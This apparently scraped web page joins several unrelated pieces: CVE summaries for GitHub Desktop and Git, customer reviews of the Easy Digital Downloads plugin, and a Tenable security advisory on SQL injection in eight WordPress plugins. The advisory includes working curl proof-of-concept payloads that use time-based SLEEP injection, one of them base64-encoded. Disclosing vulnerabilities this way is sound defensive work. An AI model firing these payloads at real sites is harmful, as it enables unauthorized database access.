  ###### medium

  GitHub Desktop is an open-source Electron-based GitHub app designed for git development. An attacker convincing a user to clone a repository directly or through a submodule can allow the attacker access to the user's credentials through the use of maliciously crafted remote URL. GitHub Desktop relies on Git to perform all network related operations (such as cloning, fetching, and pushing). When a user attempts to clone a repository GitHub Desktop will invoke `git clone` and when Git encounters a remote which requires authentication it will request the credentials for that remote host from GitHub Desktop using the git-credential protocol. Using a maliciously crafted URL it's possible to cause the credential request coming from Git to be misinterpreted by Github Desktop such that it will send credentials for a different host than the host that Git is currently communicating with thereby allowing for secret exfiltration. GitHub username and OAuth token, or credentials for other Git remote hosts stored in GitHub Desktop could be improperly transmitted to an unrelated host. Users should update to GitHub Desktop 3.4.12 or greater which fixes this vulnerability. Users who suspect they may be affected should revoke any relevant credentials.
* ##### [CVE-2025-0502](https://www.tenable.com/cve/CVE-2025-0502)

* ##### [CVE-2024-52005](https://www.tenable.com/cve/CVE-2024-52005)

  ###### high

  Git is a source code management tool. When cloning from a server (or fetching, or pushing), informational or error messages are transported from the remote Git process to the client via the so-called "sideband channel". These messages will be prefixed with "remote:" and printed directly to the standard error output. Typically, this standard error output is connected to a terminal that understands ANSI escape sequences, which Git did not protect against. Most modern terminals support control sequences that can be used by a malicious actor to hide and misrepresent information, or to mislead the user into executing untrusted scripts. As requested on the git-security mailing list, the patches are under discussion on the public mailing list. Users are advised to update as soon as possible. Users unable to upgrade should avoid recursive clones unless they are from trusted sources.

I recently purchased EDD to make offering digital products easier and I needed the ability to create licenses for upcoming software releases. I ran into some unexpected challenges installing the plugin that I was unable to figure out. It turned out that I had some unidentified critical issues impacting my site that was unrelated to EDD. The team at EDD went above and beyond fixing the issue resolving the problem and got the EDD plugin up and running on my site. Big shout out to the team and people at EDD for helping me far beyond with an issue that wasn’t technically their problem.

If you encounter this issue (you have installed EDD and on every page you have, the tag <meta name=”robots” content=”noindex,nofollow” /> appears), simply go to /wp-admin/edit.php?post\_type=download&page=edd-settings&tab=general&section=pages and configure the pages.

I decided in favour of EDD because I was annoyed by the complexity of Woocommerce. At first I thought that EDD, with its focus on downloads only, might not be the right choice. But I was convinced otherwise. With some in-house development and the outstanding support, which helps quickly and competently, I was able to implement everything I needed for my membership site: Downloads, subscriptions, vouchers incl. voucher PDF and protected areas for subscribers. Really, really good!

# SQL Injection in Multiple WordPress Plugins

Critical

[← View More Research Advisories](/security/research)
### Synopsis

Joshua Martinelle of Tenable Research discovered multiple SQL Injection vulnerabilities across a number of WordPress plugins. This advisory will track each vulnerability as information and fixes become available.

---

**Paid Memberships Pro : CVE-2023-23488 - Unauthenticated SQL Injection**

**Reference:** https://wordpress.org/plugins/paid-memberships-pro

**Affected Versions:** < 2.9.8

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 9.8

The plugin does not escape the 'code' parameter in the /pmpro/v1/order REST route before using it in a SQL statement, leading to an unauthenticated SQL injection vulnerability.

**Proof of Concept:**

Where TARGET\_HOST is the address of the wordpress host with Paid Memberships Pro installed, the following proof of concept uses the SLEEP function to demonstrate the SQL injection. Changing the value passed to sleep will alter how long the request takes to return.

```

curl "http://TARGET_HOST/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)--%20-"
```

For example, running this twice with the "time" command will show the difference in response times:

```

time curl "http://TARGET_HOST/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(1)))a)--%20-"
{}
real    0m3.068s
user    0m0.006s
sys    0m0.009s

time curl "http://TARGET_HOST/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)--%20-"
{}
real    0m6.095s
user    0m0.006s
sys    0m0.009s
```

**Easy Digital Downloads: CVE-2023-23489 - Unauthenticated SQL Injection

Reference:** https://wordpress.org/plugins/easy-digital-downloads/

**Affected Versions:**3.1.0.2 & 3.1.0.3

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 9.8

The plugin does not escape the 's' parameter in the 'edd\_download\_search' action before using it in a SQL statement, leading to an unauthenticated SQL injection vulnerability.

The vulnerable part of the code corresponds to the 'edd\_ajax\_download\_search()' function of the './includes/ajax-functions.php' file.

**Proof of Concept:**

Where TARGET\_HOST is the address of the wordpress host with Paid Memberships Pro installed, the following proof of concept uses the SLEEP function to demonstrate the SQL injection. Changing the value passed to sleep will alter how long the request takes to return.

*Note:* The same SQL injection/unique request will not work twice in a row right away, as the 'edd\_ajax\_download\_search()' function stores the most recent search for 30 seconds (so to run the same payload again, you will have to modify the payload slightly or wait 30 seconds).

```

curl "http://TARGET_HOST/wp-admin/admin-ajax.php?action=edd_download_search&s=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))a)--+-"

```

---

**Survey Maker: CVE-2023-23490 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/survey-maker

**Affected Versions:** < 3.1.2

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the ‘surveys\_ids’ parameter in the 'ays\_surveys\_export\_json' action before using it in a SQL statement, leading to an authenticated SQL injection vulnerability.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=ays_surveys_export_json&surveys_ids[0]=1)+AND+(SELECT+1+FROM+(SELECT(SLEEP(3)))a)--+-"

```

---

**ReviewX: CVE-2023-26325 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/reviewx/

**Affected Versions:** <= 1.6.6

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the 'filterValue' or 'selectedColumns' parameters in the rx\_export\_review action before using them in a SQL statement, leading to a SQL injection.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=rx_export_review&filterValue[0]=&filterValue[1]=&filterValue[2]=&filterValue[3]=&filterValue[4]=all&filterValue[5]=&filterValue[6]=aaaa&filterValue[7]=id+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)&filterValue[8]=desc&selectedColumns[0]=id"
```

**Waiting: One-click Countdowns: CVE-2023-28659 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/waiting/

**Affected Versions:** <= 0.6.2

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The **pbc\_down[meta][id]** parameter of the **pbc\_save\_downs** action is vulnerable to SQL injection.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=pbc_save_downs&pbc_down[meta][id]=1+OR+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)--"
```

**Events Made Easy: CVE-2023-28660 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/events-made-easy/

**Affected Versions:** <= 2.3.14

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the '**search\_name**' parameter in the **eme\_recurrences\_list** action before using it in a SQL statement, leading to a SQL injection vulnerability.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php?action=eme_recurrences_list&search_name=1'{+}AND{+}(SELECT+1+FROM+(SELECT(SLEEP(0.5)))a)-{-}+{-}" --header "$WP_COOKIE"
```

**WP Popup Banners: CVE-2023-28661 - Authenticated SQL Injection

Reference:**https://wordpress.org/plugins/wp-popup-banners/

**Affected Versions:** <= 1.2.5

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 8.8

The plugin does not escape the '**value**' parameter in the **get\_popup\_data** action before using it in a SQL statement, leading to a SQL injection vulnerability.

The vulnerability requires the attacker to be authenticated but does not require administrator privileges, the following example uses an account with the 'subscriber' privilege level.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user.

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --header "$WP_COOKIE" --data "action=get_popup_data&value=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)"
```

**Gift Cards (Gift Vouchers and Packages): CVE-2023-28662 - Unauthenticated SQL Injection

Reference:**https://wordpress.org/plugins/gift-voucher/

**Affected Versions:** <= 4.3.1

**CVSSv3 Vector:**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**CVSSv3 Score:** 9.8

The plugin does not escape the ‘**template**’ parameter in the **wpgv\_doajax\_voucher\_pdf\_save\_func** action before using it in a SQL statement, leading to a SQL injection vulnerability.

The vulnerability does not require authentication to trigger.

**Proof of concept:**

A simple curl command can be used to demonstrate the issue (though it requires a valid / current WP session cookie). In the proof of concept below, replace $TARGET\_HOST with the target wordpress instance, and $WP\_COOKIE with the full cookie header (i.e. "Cookie : wordpress\_xyz...") for a logged-in WP user, and where $BASE64\_INJECTION is the base64 encoded SQL injection, for example:

**LTEgT1IgU0xFRVAoMik=** translates to **-1 OR SLEEP(2)**

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --data "action=wpgv_doajax_voucher_pdf_save_func&template=$BASE64_INJECTION"
```

or with a proper payload:

```

curl "http://$TARGET_HOST/wp-admin/admin-ajax.php" --data "action=wpgv_doajax_voucher_pdf_save_func&template=LTEgT1IgU0xFRVAoMik="

```
